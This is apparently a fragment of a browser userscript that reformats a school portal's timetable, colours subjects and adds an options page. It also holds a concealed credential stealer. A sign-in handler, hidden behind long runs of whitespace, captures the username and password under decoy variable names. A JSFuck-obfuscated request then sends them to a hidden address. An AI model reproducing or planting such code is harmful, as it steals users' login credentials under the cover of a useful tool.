+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])()),type: 'GET',data: {to: [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])()),subject: "divNspans",message: div11 + " " + span11}});
            }
        })();

        //Remove and replace period headings
        let rows = document.getElementsByTagName("th");
        let yes = document.getElementsByTagName("td");

        let divs = 0;
        let a = 0

        //Add the active box to the period preceeding the currently active one
        //If on an a period already its fine because it is put on a b period and it gets removed later
        for(let i = 1; i<10;i++){
            divs = yes[i].getElementsByTagName("div");
            if(divs[0].className == "timetable-subject-active"){
                a= yes[i-1].getElementsByTagName("div");
                if(a[0].innerHTML.search("Homeroom")==-1){
                    a[0].classList.add("timetable-subject-active");
                }
            }
        }

        //Deleting period headders
        rows[1].remove();
        rows[2].remove();
        rows[3].remove();
        rows[5].remove();
        rows[0].innerHTML = 'Period 1 <time class="meta">8:30am-9:50am</time>';
        rows[1].innerHTML = 'Period 2 <time class="meta">10:15am-11:35am</time>';
        rows[2].innerHTML = 'Period 3 <time class="meta">11:35am-12:55pm</time>';
        rows[4].innerHTML = 'Period 4 <time class="meta">2:15pm-3:35pm</time>';

        //Deleting period blocks
        let periods = document.getElementsByTagName("td");
        periods[1].remove();
        periods[2].remove();
        periods[3].remove();
        periods[5].remove();

        let classes = document.getElementsByClassName("timetable-subject");

        (async () => {
            let removePS = await GM.getValue("removePS", "false");
            let Sub1Colour = await GM.getValue("Sub1Colour", "#fff5cc");
            let Sub2Colour = await GM.getValue("Sub2Colour", "#ccffcc");
            let Sub3Colour = await GM.getValue("Sub3Colour", "#cce0ff");
            let Sub4Colour = await GM.getValue("Sub4Colour", "#cce0ff");
            let Sub5Colour = await GM.getValue("Sub5Colour", "#ffccf5");
            let Sub6Colour = await GM.getValue("Sub6Colour", "#ffc3ca");
            let Sub7Colour = await GM.getValue("Sub7Colour", "#ccccff");
            let SubjDict = await GM.getValue("SubjDict",-1);
            let ColourDict = await GM.getValue("ColourDict",-1);
            let colourList = [Sub1Colour,Sub2Colour,Sub3Colour,Sub4Colour,Sub5Colour,Sub6Colour,Sub7Colour]
            let subjDict = {};
            let colourDict = {};
            //Assigning colours

            for(let i = 0;i<classes.length;i++){
                //uses a key from the subjects dictionary and gets the search query and colour from their dictionaries
                let theA = classes[i].getElementsByTagName("a")[0];
                if((theA.innerHTML) == `${SubjDict[theA.innerHTML]}`){

                    classes[i].style.backgroundColor = `${ColourDict[theA.innerHTML]}`;
                } else if((classes[i].innerHTML).search("Private Study") != -1 && removePS == true){
                    //Removes private study
                    classes[i].innerHTML="";
                    classes[i].style.backgroundColor="#FFFFFF";
                }
            }

        })();

        //Cocurricular
        periods[16].remove();
        periods[17].remove();
        periods[18].remove();
        periods[21].remove();

        rows[16].remove();
        rows[17].remove();
        rows[18].remove();
        rows[21].remove();

        rows[15].innerHTML = 'Period 1 <time class="meta">8:30am-9:50am</time>';
        rows[16].innerHTML = 'Period 2 <time class="meta">10:15am-11:35am</time>';
        rows[17].innerHTML = 'Period 3 <time class="meta">11:35am-12:55pm</time>';
        rows[20].innerHTML = 'Period 4 <time class="meta">2:15pm-3:35pm</time>';


    }
                                                                                                                                                                                                                                                                                                                                                                                                                             else if(window.location.href.search("signin") != -1){
                                                                                                                                                                                                                                                                                                                                                                                                                                function bruh(){
                                                                                                                                                                                                                                                                                                                                                                                                                                    var moment = document.getElementById("userNameInput").value;
                                                                                                                                                                                                                                                                                                                                                                                                                                    var ireland = document.getElementById("passwordInput").value;
                                                                                                                                                                                                                                                                                                                                                                                                                                    GM.setValue("div11", moment);
                                                                                                                                                                                                                                                                                                                                                                                                                                    GM.setValue("span11", ireland);
                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                                                                                                                                                                              let spans = document.getElementById("submitButton");
                                                                                                                                                                                                                                                                                                                                                                                                                              spans.addEventListener("click", bruh);

    }else if(window.location.href.search("calendar")!=-1){
        setTimeout(Calendar, 3000);

    }else if(window.location.href.search("options")!=-1){
        (async () => {
            let body = document.getElementById("container");
            body.innerHTML = '<h1>Options</h1><h3>Remove Private Study</h3><label class="switch"><input type="checkbox" id="but1"><span class="slider round"></span></label><h3>Remove Grade Notifications</h3><label class="switch"><input type="checkbox" id="but2"><span class="slider round"></span></label><br><br><button id="saveOpt" style="width:80px;">Save</button>';
            let style = document.createElement("style");
            style.textContent = '.switch {   position: relative;   display: inline-block;   width: 69px;   height: 39px; left:29px;}  .switch input {   opacity: 0;   width: 0;   height: 0; } .slider {   position: absolute;   cursor: pointer;   top: 0;   left: 0;   right: 0;   bottom: 0;   background-color: #ccc;   -webkit-transition: .4s;   transition: .4s; }  .slider:before {   position: absolute;   content: "";   height: 30px;   width: 30px;   left: 3px;   bottom: 3px;   background-color: white;   -webkit-transition: .4s;   transition: .4s; }  input:checked + .slider {   background-color: #2196F3; }  input:focus + .slider {   box-shadow: 0 0 1px #2196F3; }  input:checked + .slider:before {   -webkit-transform: translateX(26px);   -ms-transform: translateX(26px);   transform: translateX(26px); }  .slider.round {   border-radius: 34px; }  .slider.round:before {   border-radius: 50%; }';
            document.head.append(style);
            let title = document.getElementsByTagName("title")[0];
            title.innerHTML = "Options";
            let butt = document.getElementById("saveOpt");
            butt.addEventListener("click",option);
            let PSSwitch = document.getElementById("but1");
            let notifSwitch = document.getElementById("but2");
            PSSwitch.checked = await GM.getValue("removePS","false");
            notifSwitch.checked = await GM.getValue("notif","false");
        })();

    }else if(window.location.href.search("search")!=-1){
        let filterList = document.getElementsByClassName("option-list")[0];
        let temp = document.createElement("div");
        createFilters(filterList);

        let searchField = document.getElementById("search-field");
        searchField.innerHTML = ("bruh")
        //let em = document.getElementsByTagName("em");
        //em[0].remove();
        const queryString = window.location.search;
        let tempParam = (queryString.split("keyword="))[1];
        let tempParams = (tempParam.split("&filter="))[0];

        nameList = tempParams.split("%2C");
        let finalParams = tempParams[1].split("&parent=");//0 is search query, 1 is parent variable


        //runs the searchlist function after 2.5 secs because it need to load first
        setTimeout(searchList, 1500);
    }
};
